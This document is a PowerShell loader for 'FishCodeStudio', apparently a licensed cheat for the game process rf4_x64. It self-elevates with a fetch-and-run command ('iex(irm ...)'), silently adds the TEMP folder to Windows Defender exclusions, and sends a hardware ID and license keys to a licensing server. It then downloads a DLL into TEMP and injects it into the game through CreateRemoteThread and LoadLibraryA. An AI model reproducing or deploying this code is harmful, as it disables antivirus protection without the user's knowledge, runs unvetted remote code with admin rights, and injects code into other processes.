#Requires -Version 5.1
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

if (-not (Test-Path "HKCU:\Software\FishCodeStudio")) {
    New-Item -Path "HKCU:\Software\FishCodeStudio" -Force | Out-Null
}

Set-ItemProperty `
    -Path "HKCU:\Software\FishCodeStudio" `
    -Name "ServerRegion" `
    -Value "NL"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -Command `"iex(irm 'http://127.0.0.1')`""
    $psi.Verb = "runas"
    try { [Diagnostics.Process]::Start($psi) | Out-Null; Exit } catch { Exit 1 }
}

function Add-DefenderTempExclusion {
    try {
        if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
            return
        }

        $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
        if (-not $defenderService -or $defenderService.Status -ne 'Running') {
            return
        }

        $preferences = Get-MpPreference -ErrorAction Stop
        $tempPath = $env:TEMP.TrimEnd('\')

        $alreadyExcluded = $preferences.ExclusionPath |
            Where-Object { $_.TrimEnd('\') -ieq $tempPath }

        if ($alreadyExcluded) {
            return
        }

        Add-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
    }
    catch {
    }
}

Add-DefenderTempExclusion

$Script:BaseDomain   = "http://127.0.0.1"
$Script:ApiUrl       = "http://127.0.0.1/api.php"
$Script:DllUrl       = "http://127.0.0.1/version.dll"
$Script:RegistryPath = "HKCU:\Software\FishCodeStudio"

try {

    Add-Type -TypeDefinition @"
        using System; using System.Runtime.InteropServices;
        public static class ConsoleHelper {
            [DllImport("kernel32.dll")] public static extern IntPtr GetStdHandle(int n);
            [DllImport("kernel32.dll")] public static extern bool GetConsoleMode(IntPtr h, out uint m);
            [DllImport("kernel32.dll")] public static extern bool SetConsoleMode(IntPtr h, uint m);
        }
"@ -ErrorAction SilentlyContinue
    $hInput = [ConsoleHelper]::GetStdHandle(-10)
    $m = 0
    if ($hInput -ne [IntPtr]::Zero -and [ConsoleHelper]::GetConsoleMode($hInput, [ref]$m)) {
        $newMode = $m -band (-bnot (0x0040 -bor 0x0080))
        [ConsoleHelper]::SetConsoleMode($hInput, $newMode) | Out-Null
    }
} catch {}

Clear-Host
$msgTelegramChannel = "https://t.me/FishCodeStudio"
$msgTelegram = ([char[]]@(1053,1086,1074,1086,1089,1090,1080,32,1080,32,1086,1073,1085,1086,1073,1083,1077,1085,1080,1103,58,32) -join "")

Clear-Host
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "       FISHCODE STUDIO       " -ForegroundColor Cyan
Write-Host "     $msgTelegram" -ForegroundColor DarkCyan
Write-Host "  $msgTelegramChannel" -ForegroundColor DarkCyan
Write-Host "=========================================" -ForegroundColor Cyan

$msgTimeErr = ([char[]]@(91,1054,1064,1048,1041,1050,1040,93,32,1057,1080,1089,1090,1077,1084,1085,1086,1077,32,1072,1088,1077,1084,1103,32,1087,1077,1088,1075,1072,1077,1074,1077,1085,1086,33,32,1059,1089,1090,1072,1085,1086,1074,1100,1090,1077,32,1090,1086,1095,1085,1086,1077,32,1072,1088,1077,1084,1103,46) -join "")
$msgPrompt = ([char[]]@(1042,1074,1077,1074,1080,1090,1077,32,1083,1080,1094,1077,1085,1079,1080,1086,1085,1085,1099,1081,32,1082,1083,1102,1095,58,32) -join "")
$msgCheck = ([char[]]@(1055,1088,1086,1074,1077,1088,1082,1072,32,1083,1080,1094,1077,1085,1079,1080,1080,46,46,46) -join "")
$msgKeyAdded = ([char[]]@(1053,1086,1074,1099,1081,32,1082,1083,1102,1095,32,1091,1089,1087,1077,1096,1085,1086,32,1076,1086,1073,1072,1074,1083,1077,1085,33) -join "")
$msgInvalid = ([char[]]@(91,1054,1064,1048,1041,1050,1040,93,32,1050,1083,1102,1095,32,1085,1077,1074,1077,1088,1077,1085,33) -join "")
$msgConnErr = ([char[]]@(91,1054,1064,1048,1041,1050,1040,93,32,1054,1096,1080,1073,1082,1072,32,1087,1086,1076,1082,1083,1102,1095,1077,1085,1080,1103,32,1082,32,1073,1101,1082,1101,1085,1076,1091,46,32,40,1074,1086,1079,1084,1086,1078,1085,1072,32,1074,1082,1083,1102,1095,1077,1085,32,86,80,78,41) -join "")
$msgAuthOk = ([char[]]@(1040,1074,1090,1086,1088,1080,1079,1072,1094,1080,1103,32,1091,1089,1087,1077,1096,1085,1072,33) -join "")
$msgLoadMod = ([char[]]@(1047,1072,1075,1088,1091,1079,1082,1072,32,1084,1086,1076,1077,1083,1077,1081,46,46,46) -join "")
$msgEnterPrompt = ([char[]]@(1053,1072,1078,1084,1080,1090,1077,32,91,69,110,116,101,114,93,44,32,1095,1090,1086,1073,1099,32,1076,1086,1073,1072,1074,1080,1090,1100,32,1077,1097,1077,32,1086,1076,1080,1085,32,1082,1083,1102,1095,46) -join "")
$msgGameOk = ([char[]]@(1048,1075,1088,1072,32,1086,1073,1085,1072,1088,1091,1078,1077,1085,1072,33,32,1042,1085,1077,1076,1088,1077,1085,1080,1077,46,46,46) -join "")
$msgWaitGame = ([char[]]@(1052,1086,1078,1077,1090,1077,32,1079,1072,1087,1091,1089,1082,1072,32,1080,1075,1088,1091,46,46,46) -join "")
$msgFileErr = ([char[]]@(91,1054,1064,1048,1041,1050,1040,93,32,1060,1072,1081,1083,32,1085,1077,32,1089,1086,1093,1088,1072,1085,1105,1085,32,1080,1083,1080,32,1073,1099,1083,32,1089,1082,1072,1095,1072,1085,44,32,1074,1086,1079,1084,1086,1078,1085,1086,32,1079,1072,1073,1083,1086,1082,1080,1088,1086,1074,1072,1085,32,1079,1072,1097,1080,1090,1085,1080,1082,1111) -join "")

try { Clear-DnsClientCache -ErrorAction SilentlyContinue } catch {}



function Test-TimeIntegrity {
    try {
        $ntp = New-Object byte[] 48; $ntp = 0x1B
        $client = New-Object System.Net.Sockets.UdpClient; $client.Client.ReceiveTimeout = 3000
        $client.Connect("windows.com", 123)
        [void]$client.Send($ntp, $ntp.Length); $ntp = $client.Receive([ref]$null); $client.Close()
        $secs = [BitConverter]::ToUInt32($ntp[43..40], 0)
        $ntpTime = (New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddSeconds($secs)
        if ([Math]::Abs(($ntpTime - [DateTime]::UtcNow).TotalSeconds) -gt 300) { return $false }

        return $true

    } catch { return $true }

}

if (-not (Test-TimeIntegrity)) {
Write-Host $msgTimeErr -ForegroundColor Red
Start-Sleep -Seconds 10
Exit
}

$SystemDriveLetter = [System.Environment]::GetEnvironmentVariable("SystemDrive")

try {
$DriveInfo = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = '$SystemDriveLetter'" -ErrorAction Stop

if ($null -eq $DriveInfo -or [string]::IsNullOrWhiteSpace($DriveInfo.VolumeSerialNumber)) {
    $Hwid = "0000"
}
else {
    $Hwid = [Convert]::ToUInt32($DriveInfo.VolumeSerialNumber, 16).ToString()
}

}
catch {
$Hwid = "0000"
}

$SavedKey = ""
$SavedBoatKey = ""

if (Test-Path $Script:RegistryPath) {
    $SavedKey = (Get-ItemProperty -Path $Script:RegistryPath -Name "LicenseKey" -ErrorAction SilentlyContinue).LicenseKey
     $SavedBoatKey = (Get-ItemProperty `
    -Path $Script:RegistryPath `
    -Name "LicenseKeyBoat" `
    -ErrorAction SilentlyContinue
).LicenseKeyBoat
}
else {
    [void](New-Item -Path $Script:RegistryPath -Force)
}

Get-ChildItem $env:TEMP -Filter "RuntimeCache_*.dll" -ErrorAction SilentlyContinue |
    Remove-Item -Force -ErrorAction SilentlyContinue
$TargetDllPath = Join-Path $env:TEMP ("RuntimeCache_" + [Guid]::NewGuid().ToString() + ".dll")

$CurrentInputKey = ""
$ForceManualInput = $false

while (1) {
    if ([string]::IsNullOrEmpty($CurrentInputKey)) {
    if ($ForceManualInput) {
        Write-Host $msgPrompt -NoNewline
        $CurrentInputKey = Read-Host
        $CurrentInputKey = $CurrentInputKey.Trim()
        $ForceManualInput = $false

        if ([string]::IsNullOrEmpty($CurrentInputKey)) {
            $ForceManualInput = $true
            continue
        }
    }
    elseif (-not [string]::IsNullOrWhiteSpace($SavedKey)) {
        $CurrentInputKey = $SavedKey
    }
    elseif (-not [string]::IsNullOrWhiteSpace($SavedBoatKey)) {
        $CurrentInputKey = $SavedBoatKey
    }
    else {
        Write-Host $msgPrompt -NoNewline
        $CurrentInputKey = Read-Host
        $CurrentInputKey = $CurrentInputKey.Trim()

        if ([string]::IsNullOrEmpty($CurrentInputKey)) {
            continue
        }
    }
}

    Write-Host $msgCheck -ForegroundColor Cyan

    if (Test-Path $TargetDllPath) {
        $postParams = @{
            key = $CurrentInputKey
            old_key = $SavedKey
            old_key_boat = $SavedBoatKey
            hwid = $Hwid
            source = 'check'
        }

        try {
            $webResponse = Invoke-RestMethod -Uri $Script:ApiUrl -Method Post -Body $postParams -Headers @{"Host"="fishcode-studio.online"} -TimeoutSec 15

            if ($webResponse -like "success_check*") {
                $parts = $webResponse.Split('|')

                if ($parts.Count -ge 2) {
                    $productCode = $parts[1].Split('=')[0]

                    if ($productCode -eq "BASE") {
                        [void](Set-ItemProperty `
                            -Path $Script:RegistryPath `
                            -Name "LicenseKey" `
                            -Value $CurrentInputKey)

                        $SavedKey = $CurrentInputKey
                    }

                    if ($productCode -eq "BOAT") {
                        [void](Set-ItemProperty `
                            -Path $Script:RegistryPath `
                            -Name "LicenseKeyBoat" `
                            -Value $CurrentInputKey)

                        $SavedBoatKey = $CurrentInputKey
                    }

                    Write-Host $msgKeyAdded -ForegroundColor Green
                }
                else {
                     Write-Host $msgInvalid -ForegroundColor Red
                    $CurrentInputKey = ""
                    $ForceManualInput = $true
                    continue
                }
            }
            else {
                Write-Host $msgInvalid -ForegroundColor Red
                $CurrentInputKey = ""
                $ForceManualInput = $true
                continue
            }
        } catch {
            Write-Host $msgConnErr -ForegroundColor Red
            Start-Sleep -Seconds 5; Exit
        }
    } else {
        $ValidSavedKey = ""
        $NeedUserInput = $false

        if (-not [string]::IsNullOrWhiteSpace($SavedKey)) {
            $checkBaseParams = @{
                key = $SavedKey
                old_key = $SavedKey
                old_key_boat = $SavedBoatKey
                hwid = $Hwid
                source = 'check'
            }

            try {
                $checkBaseResponse = Invoke-RestMethod -Uri $Script:ApiUrl -Method Post -Body $checkBaseParams -Headers @{"Host"="fishcode-studio.online"} -TimeoutSec 15

                if ($checkBaseResponse -like "success_check*") {
                    $ValidSavedKey = $SavedKey
                }
                else {
                    Remove-ItemProperty -Path $Script:RegistryPath -Name "LicenseKey" -ErrorAction SilentlyContinue
                    $SavedKey = ""
                }
            } catch {
                Write-Host $msgConnErr -ForegroundColor Red
                Start-Sleep -Seconds 5; Exit
            }
        }

        if (-not [string]::IsNullOrWhiteSpace($SavedBoatKey)) {
            $checkBoatParams = @{
                key = $SavedBoatKey
                old_key = $SavedKey
                old_key_boat = $SavedBoatKey
                hwid = $Hwid
                source = 'check'
            }

            try {
                $checkBoatResponse = Invoke-RestMethod -Uri $Script:ApiUrl -Method Post -Body $checkBoatParams -Headers @{"Host"="fishcode-studio.online"} -TimeoutSec 15

                if ($checkBoatResponse -like "success_check*") {
                    $ValidSavedKey = $SavedBoatKey
                }
                else {
                    Remove-ItemProperty -Path $Script:RegistryPath -Name "LicenseKeyBoat" -ErrorAction SilentlyContinue
                    $SavedBoatKey = ""
                }
            } catch {
                Write-Host $msgConnErr -ForegroundColor Red
                Start-Sleep -Seconds 5; Exit
            }
        }

        if ([string]::IsNullOrWhiteSpace($ValidSavedKey)) {
            $checkParams = @{
                key = $CurrentInputKey
                old_key = $SavedKey
                old_key_boat = $SavedBoatKey
                hwid = $Hwid
                source = 'check'
            }

            try {
                $checkResponse = Invoke-RestMethod -Uri $Script:ApiUrl -Method Post -Body $checkParams -Headers @{"Host"="fishcode-studio.online"} -TimeoutSec 15

                if ($checkResponse -notlike "success_check*") {
                    Write-Host $msgInvalid -ForegroundColor Red
                    $CurrentInputKey = ""
                    continue
                }

                $checkParts = $checkResponse.Split('|')

                if ($checkParts.Count -lt 2) {
                    Write-Host $msgInvalid -ForegroundColor Red
                    $CurrentInputKey = ""
                    continue
                }

                $productCode = $checkParts[1].Split('=')[0]

                if ($productCode -eq "BASE") {
                    [void](Set-ItemProperty -Path $Script:RegistryPath -Name "LicenseKey" -Value $CurrentInputKey)
                    $SavedKey = $CurrentInputKey
                    $ValidSavedKey = $CurrentInputKey
                }

                if ($productCode -eq "BOAT") {
                    [void](Set-ItemProperty -Path $Script:RegistryPath -Name "LicenseKeyBoat" -Value $CurrentInputKey)
                    $SavedBoatKey = $CurrentInputKey
                    $ValidSavedKey = $CurrentInputKey
                }

                if ($productCode -ne "BASE" -and $productCode -ne "BOAT") {
                    Write-Host $msgInvalid -ForegroundColor Red
                    $CurrentInputKey = ""
                    continue
                }
            } catch {
                Write-Host $msgConnErr -ForegroundColor Red
                Start-Sleep -Seconds 5; Exit
            }
        }

        $postParams = @{ key = $ValidSavedKey; hwid = $Hwid; source = 'loader' }

        try {
            $webResponse = Invoke-RestMethod -Uri $Script:ApiUrl -Method Post -Body $postParams -Headers @{"Host"="fishcode-studio.online"} -OutFile $TargetDllPath -TimeoutSec 15

            if (-not (Test-Path $TargetDllPath)) {
                Write-Host $msgFileErr -ForegroundColor Red
                Start-Sleep -Seconds 10
                Exit
            }

            if ((Get-Item $TargetDllPath).Length -lt 1000) {
                if (Test-Path $TargetDllPath) { Remove-Item $TargetDllPath -Force }
                Write-Host $msgInvalid -ForegroundColor Red
                $CurrentInputKey = ""
                continue
            }
        } catch {
            Write-Host $msgConnErr -ForegroundColor Red
            if (Test-Path $TargetDllPath) { Remove-Item $TargetDllPath -Force }
            Start-Sleep -Seconds 5; Exit
        }
    }

    if (Test-Path $TargetDllPath) {
        Write-Host $msgAuthOk -ForegroundColor Green
        Write-Host $msgWaitGame -ForegroundColor Yellow
        Write-Host $msgEnterPrompt -ForegroundColor Cyan

        $GoToInject = $false
        $ResetToInput = $false

        while (-not $GoToInject -and -not $ResetToInput) {
            if (Get-Process -Name "rf4_x64" -ErrorAction SilentlyContinue) {
                $GoToInject = $true
                break
            }
            if ([Console]::KeyAvailable) {
                $keyInfo = [Console]::ReadKey($true)
                if ($keyInfo.Key -eq [ConsoleKey]::Enter) {
                    $ResetToInput = $true
                    break
                }
            }
            Start-Sleep -Milliseconds 150
        }

      if ($ResetToInput) {
            $CurrentInputKey = ""
            $ForceManualInput = $true
            
            Clear-Host
            Write-Host "=========================================" -ForegroundColor Cyan
            Write-Host "       FISHCODE STUDIO       " -ForegroundColor Cyan
            Write-Host "=========================================" -ForegroundColor Cyan
            continue
        }

        if ($GoToInject) {
            break
        }
    }
}



Write-Host $msgGameOk -ForegroundColor Green

$WinApiCode = @"
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int p);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr ad, uint s, int t, int fl);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr ad, byte[] b, uint s, out int w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr r, IntPtr arg, uint f, IntPtr id);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
"@

$WinApiType = Add-Type -MemberDefinition $WinApiCode -Name 'EngineInject' -Namespace 'Win32' -PassThru
$GameProcess = Get-Process -Name "rf4_x64" -ErrorAction SilentlyContinue
$hProcess = [Win32.EngineInject]::OpenProcess(0x1F0FFF, $false, $GameProcess.Id)
$dllBytes = [System.Text.Encoding]::ASCII.GetBytes($TargetDllPath + "`0")
$allocMem = [Win32.EngineInject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, 0x3000, 0x40)
[Win32.EngineInject]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, [uint32]$dllBytes.Length, [ref]$null) | Out-Null
$loadLibraryAddress = [Win32.EngineInject]::GetProcAddress([Win32.EngineInject]::GetModuleHandle('kernel32.dll'), 'LoadLibraryA')
[Win32.EngineInject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddress, $allocMem, 0, [IntPtr]::Zero) | Out-Null
Start-Sleep -Milliseconds 300

Exit 0